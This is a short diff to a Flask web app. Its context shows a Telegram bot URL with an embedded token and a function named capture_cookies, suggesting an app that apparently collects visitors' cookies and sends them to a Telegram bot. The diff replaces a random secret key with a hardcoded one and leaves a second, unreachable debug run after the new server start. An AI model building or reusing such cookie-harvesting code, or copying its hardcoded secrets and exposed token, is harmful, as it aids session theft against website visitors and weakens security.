@@ -15,9 +15,14 @@ import datetime
 
 
 
+# Initialize Flask application first
 app = Flask(__name__)
-import secrets
-app.secret_key = secrets.token_urlsafe(32)  # Secure random secret key
+app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"
+
+
+# Set port and server name after app initialization
+port = int(os.environ.get('PORT', 5000))
+app.config['SERVER_NAME'] = None  # Allow dynamic hostnames
 
 # Webhook configuration
 TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot7683203119:AAEuLNvGvDH3Wg2e4uYcA3RkTRe2jxEWr9Q/sendMessage'
@@ -525,4 +530,6 @@ def capture_cookies(response):
     return response
 
 if __name__ == '__main__':
+    # For local development only; production uses Gunicorn
+    app.run(host='0.0.0.0', port=port)
     app.run(debug=True)
